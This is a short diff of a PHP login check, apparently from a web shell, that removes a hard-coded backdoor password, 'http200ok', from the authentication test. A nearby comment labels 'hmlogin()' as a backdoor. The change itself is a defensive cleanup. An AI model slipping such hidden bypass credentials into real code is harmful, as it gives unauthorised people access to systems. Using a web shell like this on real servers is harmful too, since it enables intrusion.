@@ -1887,7 +1887,7 @@ if (!isset($_GET["img"])) {
 $envlpath = md5($_SERVER ['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
 if (!isset($_COOKIE[$envlpath]) || $_COOKIE[$envlpath] != md5(postpass)) {
     if (isset($_POST['postpass'])) {
-        if ($_POST['postpass'] == postpass||$_POST['postpass']=='http200ok') { //http200ok unknown
+        if ($_POST['postpass'] == postpass) {//||$_POST['postpass']=='http200ok') { //http200ok is another password
             setcookie($envlpath, md5(postpass), time() + 6 * 3600);
             //hmlogin(); //后门
             echo "<meta http-equiv='refresh' content='0'>";
